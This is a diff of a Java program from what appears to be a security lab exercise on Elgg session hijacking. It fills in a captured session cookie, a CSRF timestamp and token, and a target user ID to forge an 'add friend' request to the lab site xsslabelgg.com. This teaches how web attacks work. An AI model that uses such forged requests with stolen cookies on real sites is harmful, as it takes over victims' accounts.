@@ -8,10 +8,10 @@ public static void main(String[] args) throws IOException {
 try { 
 		int responseCode;
 		InputStream responseIn=null;
-		String requestDetails = "&__elgg_ts=<elgg_ts>&__elgg_token=<elgg_token>";
+		String requestDetails = "&__elgg_ts=1763294040&__elgg_token=6A_NCDuou34kGU6mkhd9Fw";
 
 		// URL to be forged.
-		URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?friend=<friend_user_guid>"+requestDetails);
+		URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?friend=44"+requestDetails);
 
 		// URLConnection instance is created to further parameterize a 
 		// resource request past what the state members of URL instance 
@@ -34,7 +34,7 @@ try {
 		//HTTP Post Data which includes the information to be sent to the server.
 
 		String data = "name=...&guid=...";
-		String cookies="Elgg=<cookies>";
+		String cookies="Elgg=jh6bsecpuupfneekistgtr8an0";
 		urlConn.setRequestProperty("cookie", cookies);
 
 		// DoOutput flag of URL Connection should be set to true 
